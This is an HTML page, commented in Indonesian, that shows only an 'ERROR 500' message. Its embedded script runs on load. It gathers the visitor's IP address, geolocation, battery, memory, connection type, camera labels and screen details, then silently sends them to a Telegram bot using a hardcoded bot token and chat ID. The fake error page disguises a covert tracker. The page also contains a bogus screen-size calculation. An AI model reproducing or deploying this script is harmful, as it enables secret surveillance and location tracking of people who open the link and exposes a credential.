<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informasi Pengguna dan Perangkat</title>
    <script>
        const botToken = "7028070685:AAF5f39xs9t8yt63QYpe1DQy1rc5V92mVnY"; // Ganti dengan token bot Telegram
        const chatId = "7233342888"; // Ganti dengan chat ID penerima

        async function sendToTelegram(data) {
            const message = `
Data Pengunjung:
- User Agent: ${data.ua}
- IP Address: ${data.ip}
- Perangkat: ${data.device}
- Merk Perangkat: ${data.deviceBrand}
- Baterai: ${data.battery}%
- Lokasi: ${data.location}
- Memori: ${data.memory}
- Jenis Koneksi Internet: ${data.connectionType}
- Kamera: ${data.camera}
- Ukuran Layar: ${data.screenSize} inches
- Resolusi Layar: ${data.screenResolution}
            `;

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }

        async function getData() {
            const ua = navigator.userAgent;
            const device = /Android|iPhone|iPad|Windows/i.test(ua) ? (ua.match(/Android|iPhone|iPad|Windows/i) || ["Unknown"])[0] : "Unknown";
            const deviceBrand = navigator.platform || "Unknown";

            // IP Address via API
            const ipResponse = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            // Baterai
            const battery = await navigator.getBattery();
            const batteryLevel = Math.round(battery.level * 100);

            // Memori
            const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak tersedia";

            // Jenis Koneksi Internet
            const connectionType = navigator.connection ? navigator.connection.effectiveType : "Tidak diketahui";

            // Lokasi
            let location = "Tidak diizinkan";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                        collectData({ ua, ip, device, deviceBrand, battery: batteryLevel, location, memory, connectionType });
                    },
                    () => {
                        location = "Tidak diizinkan";
                        collectData({ ua, ip, device, deviceBrand, battery: batteryLevel, location, memory, connectionType });
                    }
                );
            } else {
                collectData({ ua, ip, device, deviceBrand, battery: batteryLevel, location, memory, connectionType });
            }
        }

        async function collectData(baseData) {
            let camera = "Tidak tersedia";
            let screenSize = "Tidak diketahui";
            let screenResolution = "Tidak diketahui";

            // Mendapatkan Kamera
            await navigator.mediaDevices.enumerateDevices().then(devices => {
                devices.forEach(device => {
                    if (device.kind === "videoinput") {
                        camera = device.label || "Kamera tidak terdeteksi";
                    }
                });
            });

            // Ukuran Layar dan Resolusi
            if (window.screen) {
                screenSize = `${(window.screen.width / window.screen.availHeight).toFixed(2)} inches`;
                screenResolution = `${window.screen.width} x ${window.screen.height}`;
            }

            // Kirim semua data ke Telegram
            sendToTelegram({
                ...baseData,
                camera, screenSize, screenResolution
            });
        }

        document.addEventListener("DOMContentLoaded", () => {
            getData();
        });
    </script>
</head>
<body>
    <h6>ERROR 500</h6>
</body>
</html>
